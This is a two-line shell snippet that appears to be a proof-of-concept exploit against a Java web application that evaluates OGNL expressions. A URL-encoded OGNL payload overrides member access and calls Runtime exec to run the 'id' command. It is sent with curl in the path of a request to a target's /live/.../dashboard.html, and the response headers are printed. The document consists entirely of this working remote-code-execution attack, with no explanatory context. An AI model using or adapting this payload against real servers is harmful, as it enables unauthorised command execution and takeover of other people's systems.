PAY='%24%7B%23_memberAccess%3D%23_memberAccess%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%2C%40java.lang.Runtime%40getRuntime%40exec%28%27id%27%29.%7B0%7D%29%7D'
curl -sk "${URL}/live/${PAY}/dashboard.html" -i | head -20
